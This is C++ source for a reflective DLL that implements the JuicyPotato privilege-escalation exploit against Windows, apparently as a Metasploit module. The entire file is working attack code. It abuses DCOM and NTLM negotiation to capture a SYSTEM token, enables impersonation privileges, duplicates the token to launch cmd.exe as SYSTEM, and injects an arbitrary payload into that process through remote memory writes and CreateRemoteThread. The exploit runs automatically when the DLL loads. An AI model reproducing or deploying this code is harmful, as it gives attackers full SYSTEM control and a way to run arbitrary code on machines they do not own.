#include "stdafx.h"
#include "ReflectiveLoader.h"
#include "MSFRottenPotato.h"

extern "C" HINSTANCE hAppInstance;
EXTERN_C IMAGE_DOS_HEADER __ImageBase;

HANDLE ElevatedToken, DupedToken;
wchar_t* cmdproc;

int JuicyPotato(LPVOID lpPayload)
{
	PotatoAPI* test = new PotatoAPI();
	test->startCOMListenerThread();
	test->startRPCConnectionThread();
	test->triggerDCOM();
	int ret = 0;
	while (true) {
		if (test->negotiator->authResult != -1) {
			HANDLE hToken;
			TOKEN_PRIVILEGES tkp;
			SECURITY_DESCRIPTOR sdSecurityDescriptor;
			printf("\n[+] authresult %d\n", test->negotiator->authResult);

			//Get a token for this process.
			if (!OpenProcessToken(GetCurrentProcess(),
				TOKEN_ALL_ACCESS, &hToken))return 0;


			EnablePriv(hToken, SE_IMPERSONATE_NAME);
			EnablePriv(hToken, SE_ASSIGNPRIMARYTOKEN_NAME);
			PTOKEN_TYPE ptg;
			DWORD dwl = 0;
			HANDLE hProcessToken;
			OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS,
				&hProcessToken);

			QuerySecurityContextToken(test->negotiator->phContext, &ElevatedToken);
			IsTokenSystem(ElevatedToken);

			GetTokenInformation(ElevatedToken, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
			if (!dwl) {
				printf("[-] Error getting token type: error code 0x%lx\n", GetLastError());
			}

			ret = DuplicateTokenEx(ElevatedToken,
				TOKEN_ALL_ACCESS,
				NULL,
				SecurityImpersonation,
				TokenPrimary,
				&DupedToken);

			GetTokenInformation(DupedToken, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
			if (!dwl) {
				printf("Error getting token type: error code 0x%lx\n", GetLastError());
			}

			DWORD SessionId;
			PROCESS_INFORMATION pi;
			STARTUPINFO si;
			SECURITY_ATTRIBUTES sa;


			ZeroMemory(&si, sizeof(STARTUPINFO));
			ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
			memset(&pi, 0x00, sizeof(PROCESS_INFORMATION));
			si.cb = sizeof(STARTUPINFO);
			si.lpDesktop = L"winsta0\\default";

			DWORD sessionId = WTSGetActiveConsoleSessionId();
			cmdproc = L"cmd.exe"; 

			ret = CreateProcessWithTokenW(DupedToken, 0, cmdproc, NULL, 0, NULL, NULL, &si, &pi);
			if (!ret) 
			{
				printf("\n[-] CreateProcessWithTokenW Failed to create proc: %d\n", GetLastError());
				ret = CreateProcessAsUserW(DupedToken,cmdproc,NULL,nullptr, nullptr,FALSE, 0, nullptr,L"C:\\", &si, &pi);
				if (!ret) 
				{
					printf("\n[-] CreateProcessAsUser Failed to create proc: %d\n", GetLastError());
				}
				else
				{
					printf("\n[+] CreateProcessAsUser OK\n");

					LPVOID vptr = (int*)VirtualAllocEx(pi.hProcess, NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
					SIZE_T lpnumber = 0;
					BOOL b = WriteProcessMemory(pi.hProcess, vptr, lpPayload, 4096, &lpnumber);
					HANDLE h = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)vptr, NULL, 0, 0);
					if (h == NULL)
					{
						printf("[-] Failed to execute payload\n");
					}
					
					break;
				}
			}
			else
			{
				printf("\n[+] CreateProcessWithTokenW OK\n");

				LPVOID vptr = (int*)VirtualAllocEx(pi.hProcess, NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
				SIZE_T lpnumber = 0;
				BOOL b = WriteProcessMemory(pi.hProcess, vptr, lpPayload, 4096, &lpnumber);
				HANDLE h = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)vptr, NULL, 0,0);
				if (h == NULL)
				{
					printf("[-] Failed to execute payload\n");
				}


			}
			break;
		}
		else {
			Sleep(500);
		}
	}
	return ret;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	DWORD dwResult = 0;
	long lpayloadLength;

	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE *)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;

		JuicyPotato(lpReserved);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}
